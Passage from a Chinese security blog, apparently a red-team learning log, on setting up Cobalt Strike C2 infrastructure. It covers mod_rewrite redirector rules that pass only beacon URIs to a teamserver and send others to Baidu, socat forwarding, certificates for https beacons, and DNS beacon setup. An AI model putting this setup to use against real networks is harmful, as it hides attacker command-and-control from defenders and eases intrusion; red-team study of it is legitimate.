<p>​        这样可能不好理解，我们通过一些实例来帮助我们理解,我们再设置一个.htaccess文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;test666&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        当我们使用上面的.htaccess后，我们直接通过浏览器去访问1.html文件，会显示文件不存在，也就是说RewriteRule这个规则没有生效。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907103945803.png" alt="image-20200907103945803"></p>
<p>​        我们尝试抓包将user_agent部分修改为test666，这样就可以正常访问到。也就是说规则生效了。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104222145.png" alt="image-20200907104222145"></p>
<p>案例一：根据referer来进行筛选</p>
<p>​        .htaccess文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_REFERER&#125;&quot; &quot;test666.com&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        直接访问1.html仍然访问不到</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104525076.png" alt="image-20200907104525076"></p>
<p>​        通过添加referer内容为test666.com则可以正常访问到</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104621874.png" alt="image-20200907104621874"></p>
<h3 id="mod-rewrite重定向cobaltstrike"><a href="#mod-rewrite重定向cobaltstrike" class="headerlink" title="mod_rewrite重定向cobaltstrike"></a>mod_rewrite重定向cobaltstrike</h3><p>​        根据目标访问的目录不同来进行重定向操作，只有当目标访问到某个特定的地址时，将流量重定向到我们的teamserver，将其他的流量重定向到百度。</p>
<p>​        我这里cobaltstrike流量这里还是以github上开源的msu_edu.profile的流量来进行配置。我们主要关注下get和post请求部分的url。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;get请求部分</span><br><span class="line"> set uri &quot;&#x2F;getsearchresults&quot;;   &#x2F;&#x2F;post部分</span><br><span class="line">set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;stager部分</span><br><span class="line">set uri_x64 &quot;&#x2F;events&quot;   &#x2F;&#x2F;stager部分</span><br></pre></td></tr></table></figure>

<p>​        好的，得到了这个以后我们在重定向的那台主机上设置.htaccess的规则,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(siteindex&#x2F;a&#x2F;|siteindex&#x2F;c&#x2F;|siteindex&#x2F;c&#x2F;|getsearchresults|Events|events)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8080%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br></pre></td></tr></table></figure>

<p>​        设置好以后我们在cobaltstrike中创建一个listener,地址填入重定向主机的地址，这里需要注意，http port(C2)的端口需要和重定向主机apache的端口一致。apache的端口修改在/etc/httpd/conf/httpd.conf中,修改后重启apache服务即可。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151628805.png" alt="image-20200907151628805"></p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907115815700.png" alt="image-20200907115815700"></p>
<p>​        设置好以后我们生成一个shell看下能否正常上线并执行命令</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151750637.png" alt="image-20200907151750637"></p>
<p>​        <img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151845447.png" alt="image-20200907151845447"></p>
<p>​        但是我们直接去访问重定向的那台主机，如果加入其他路径是无法访问成功的。</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907152105597.png" alt="image-20200907152105597"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习，我们了解了如何通过mod_rewrite的规则设置来进行流量的控制，通过这种方法可以进行访问控制，从而在一定程度上提升溯源的难度。也可以通过https来设置重定向，这样抓到的流量也看不到具体的路径信息。我们也可以给前置服务器加上CDN，这样也可以在一定层面上增加溯源的难度。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B01-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0http%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/" target="_blank" rel="noopener">CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于CobaltStrike各种协议beacon的使用总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-02 20:15:47" itemprop="dateCreated datePublished" datetime="2020-09-02T20:15:47+08:00">2020-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-04 16:56:44" itemprop="dateModified" datetime="2020-09-04T16:56:44+08:00">2020-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        在之前的学习中我们了解了关于CobaltStrike beacon运行的流程，以及流量的修改，今天我们一起来学习一下CobaltStrike自带的各种beacon的使用。</p>
<h3 id="http-beacon"><a href="#http-beacon" class="headerlink" title="http beacon"></a>http beacon</h3><p>​        http beacon 使用get方式去获取服务端下发的任务，同时使用post方式向服务端获取数据。关于使用ip上线我相信大家都已经非常熟悉了，所以我主要讲一下关于域名上线需要注意的问题。</p>
<h4 id="设置域名上线"><a href="#设置域名上线" class="headerlink" title="设置域名上线"></a>设置域名上线</h4><p>​         当我们打开cobaltstrike 4.0时，添加一个http listener，通常界面如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114217908.png" alt="image-20200903114217908"></p>
<p>​        这里主要注意一下http hosts设置这里，我在参考手册上看到这里可以设置多个地址作为回连的地址，我以为可以同时设置几个服务器ip，当执行后可以同时在这几个服务器上获得beacon，在网上查了很多资料也没有发现关于这里配置的一个解释。最后经过实践发现，这里是可以配置多个域名并且这些域名指向的是我们同一个团队服务器，这样才能正常上线。配置好以后我们使用wireshark看看。</p>
<p>​        我们可以看到，当执行exe通过stager下载stage时，使用的http host（stager）的地址</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114500405.png" alt="image-20200903114500405"></p>
<p>​        心跳包则使用了我们在http hosts中配置的地址</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114639258.png" alt="image-20200903114639258"></p>
<p>​        并且这些请求的地址会根据我们在http hosts中的设置自动切换不同的地址</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903115125593.png" alt="image-20200903115125593"></p>
<p>​        上面我们演示了如何使用多个域名上线的方法，因为我这里的域名加了cludefalre的cdn，配置多个子域名解析到同一个服务器，配置如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903120016032.png" alt="image-20200903120016032"></p>
<p>​        还有一个小坑就是cludefalre针对http协议只允许几个端口，如果使用其他的端口则会导致上线失败</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903120117553.png" alt="image-20200903120117553"></p>
<h4 id="设置重定向"><a href="#设置重定向" class="headerlink" title="设置重定向"></a>设置重定向</h4><p>​            在linux下我们可以使用socat来做重定向，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:xxx.xxx.xxx.xx:8080</span><br></pre></td></tr></table></figure>

<p>​        通过上面的设置，当我们访问本地的80端口时，实际上会把流量转发到远程主机的8080端口</p>
<p>​        首先我再远程vps上开启了8888端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141235269.png" alt="image-20200903141235269"></p>
<p>​        在本地的kali上做了一个重定向，将kali的88端口的流量重定向到远程主机的8888端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141204409.png" alt="image-20200903141204409"></p>
<p>​        最后，当我们访问本地的88端口实际上访问的是远程地址的8888端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141331725.png" alt="image-20200903141331725"></p>
<p>​        通过上面的学习我们了解了关于socat做重定向的使用，现在我们再来看看如何在cobaltstrike中使用重定向。</p>
<p>​        首先我们在自己已有的一个服务器上开启重定向，将来自8080的流量转发到我们的teamserver服务器的8080端口</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903161651534.png" alt="image-20200903161651534"></p>
<p>​        然后我们再cobaltstrkie中进行配置，这里的配置无论是http hosts 还是 http host(stager)我们都配置为转发的那台服务器的地址或者对应的域名，而不是我们的teamserver的，这里需要注意。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903161845634.png" alt="image-20200903161845634"></p>
<p>​        配置好listener以后，我们生成exe执行，使用wireshark进行抓包，我们可以看到，无论是下载stage的请求还是心跳包，请求的都是我们配置的重定向服务器的地址，而不是我们真正的teamserver的地址，这样就可以保护我们的teamserver服务器地址不会泄露。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162253680.png" alt="image-20200903162253680"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162523973.png" alt="image-20200903162523973"></p>
<p>​    我们可以在多个服务器上执行转发操作，来保护我们teamserver的安全，只要在http hosts中进行添加即可。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162836545.png" alt="image-20200903162836545"></p>
<p>​    在设置完listener以后，可以通过向重定向服务器的8080端口发起请求，查看cobaltstrike web log的方法测试重定向是否设置成功。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163205116.png" alt="image-20200903163205116"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163221050.png" alt="image-20200903163221050"></p>
<p>​        还需要注意的是，我们在设置转发的时候可以通过给远程地址使用域名来进行重定向，但是需要注意的是，如果使用的这个域名是有cdn的，则会转发失败。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163427110.png" alt="image-20200903163427110"></p>
<p>​    实际上可以用来做重定向的方法还有几种，不过这个不是我们今天的重点，以后我会讲关于其他重定向方法的使用。</p>
<h3 id="https-beacon"><a href="#https-beacon" class="headerlink" title="https beacon"></a>https beacon</h3><p>​        使用https会对传输过程中的通讯流量进行加密传输，其余的设置和http beacon相同。</p>
<h4 id="配置合法证书上线"><a href="#配置合法证书上线" class="headerlink" title="配置合法证书上线"></a>配置合法证书上线</h4><p>​        要配置合法的证书上线，首先我们得拥有一个自己的域名，购买域名后，可以到<a href="https://freessl.cn/" target="_blank" rel="noopener">freessl</a>为我们购买的域名申请证书，选择浏览器生成</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175452968.png" alt="image-20200903175452968"></p>
<p>​        点击生成后会下载一个压缩包，并且会到如下界面，需要在自己的域名解析那配置一个解析记录。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175552101.png" alt="image-20200903175552101"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175731164.png" alt="image-20200903175731164"></p>
<p>​        配置完成后，点击“配置完成，检测一下”功能进行检测。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190309403.png" alt="image-20200903190309403"></p>
<p>​        检测通过后，点击验证</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190642071.png" alt="image-20200903190642071"></p>
<p>​        验证通过后，会来到如下界面</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190904144.png" alt="image-20200903190904144"></p>
<p>​        下载以后有两个文件</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190958373.png" alt="image-20200903190958373"></p>
<p>​        将这两个文件传到我们服务器cobaltstrike所在的目录下，执行下面的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out www.xxx.com -name www.xxx.com -passout pass:xxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903191955435.png" alt="image-20200903191955435"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass sectest666 -destkeypass xxxx -destkeystore test666.store -srckeystore www.xxx.com -srcstoretype PKCS12 -srcstorepass sectest666 -alias www.xxx.com</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192159669.png" alt="image-20200903192159669"></p>
<p>​        生成好以后，将证书设置到我们的profile文件中，找到 https-certificate下的内容，将密码和store文件名进行替换，我以msu_edu.profile文件为例，配置如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192707348.png" alt="image-20200903192707348"></p>
<p>​        将profile文件设置好以后，使用./c2lint msu_edu.profile 进行验证</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192849282.png" alt="image-20200903192849282"></p>
<p>​        最后，我们还需要在teamserver这个文件中修改keyStore的文件名和keyStorePassword的值。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903193351419.png" alt="image-20200903193351419"></p>
<p>​        开启服务端后，创建一个https beacon,其中https  hosts和https host (stager)都配置为我们申请证书的域名</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094728657.png" alt="image-20200904094728657"></p>
<p>​        生成一个web drivery（s），这里<strong>host需要使用我们申请的域名的地址</strong>，否则是上不了线的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903193932046.png" alt="image-20200903193932046"></p>
<p>​        生成的链接我们访问一下，可以看到证书是没有问题的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094828902.png" alt="image-20200904094828902"></p>
<p>​        执行powershell后即可上线</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094924959.png" alt="image-20200904094924959"></p>
<p>​        因为这里我们使用的是https协议，所以使用wireshark是看不到请求的内容的。</p>
<h3 id="DNS-beacon"><a href="#DNS-beacon" class="headerlink" title="DNS beacon"></a>DNS beacon</h3><p>​        在一些隔离比较好的网络里，一般http或者https协议可能是不出网的，但是DNS协议是出网的，因此可以使用DNS协议来帮助我们来传输数据。</p>
<h4 id="配置DNS-解析"><a href="#配置DNS-解析" class="headerlink" title="配置DNS 解析"></a>配置DNS 解析</h4><p>​        首先我们需要在DNS上设置一个A记录,将我们申请的一个域名的子域名指向我们的teamserver服务器的ip地址。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904101728925.png" alt="image-20200904101728925"></p>
<p>​        之后需要添加一个NS记录，记录名可以写上dns，记录值写入test666.xxx.com</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904102228588.png" alt="image-20200904102228588"></p>
<p>​        设置好以后，当我们去请求xxx.dns.xxx.com时，首先dns首先会解析到xxx.com，再发现dns.xxx.com是test666.xxx.com来解析，然后就可以找到test666.xxx.com对应的ip地址来进行通信。</p>
<p>​        然后我们在cobaltstrkie中开启一个dns listener,这里DNS Hosts和DNS Host(stager)都需要配置为dns.xxx.com</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904104939022.png" alt="image-20200904104939022"></p>
<p>​        开启监听后，我们再使用nslookup进行测试,但是我们看到这个地址是8.8.8.8，这个是因为我们在profile文件中配置的问题，可以在文件中的dns_idle这个参数进行配置，cobaltstrike会通过返回这个地址告诉客户端没有安排任务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup dns.xxx.com test666.xxx.com</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904105137130.png" alt="image-20200904105137130"></p>
<p>​        配置好以后我们首先生成一个executable的shell，这种shell有个特点，之前的文章中我们分析过，就是他会分阶段请求，因此生成的文件stager文件比较小，实际在执行阶段会去下载相对来说比较大的stage文件，我们将生成的shell执行后抓包，可以看到客户端向我们的域名发起解析大量的解析请求。而且在等待了一小段时间后发现还是没有上线，因为要下载的stage文件比较大，大概200多k左右，使用dns解析去获取这个文件会非常慢，这也是为什么很多人测试dns上线以为失败了的原因。<img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904110829625.png" alt="image-20200904110829625"></p>
<p>​        因此，我们在使用DNS上线cobaltstrike的时候就不要使用分阶段执行的方式了，直接生成一个stageless的shell就好了。当使用stageless的shell后，执行后发起的请求非常少，并且也可以马上上线。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904111354460.png" alt="image-20200904111354460"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904111427752.png" alt="image-20200904111427752"></p>
<p>​        可以看到上线以后是一个黑框，这个就是DNS beacon上线后的样子，这个时候如果我们去执行命令会执行失败，这个时候我们需要使用一个checkin命令，让dns beacon回连我们的teamserver，理论上讲设置了checkin以后就会和我们其他隧道上线后的样子一样，但我设置以后还是还是迟迟没有上线，这里是因为数据传输过慢而导致的，我们可以再执行mode dns-txt来加快数据传输的速度，当我们执行完这个命令后再看下数据包</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904112605904.png" alt="image-20200904112605904"></p>
